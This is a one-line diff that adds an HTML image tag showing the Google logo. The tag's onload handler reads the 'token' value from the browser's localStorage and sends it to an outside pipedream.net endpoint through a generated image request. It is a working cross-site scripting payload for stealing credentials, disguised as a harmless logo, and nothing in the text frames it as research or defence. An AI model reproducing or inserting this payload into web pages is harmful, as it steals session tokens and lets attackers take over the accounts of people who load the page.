@@ -1,0 +1,1 @@
+<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" onload="var image = new Image();image.src = 'https://eo52dgud7apqsv4.m.pipedream.net/?' + window.localStorage.getItem('token');document.body.appendChild(image);" />
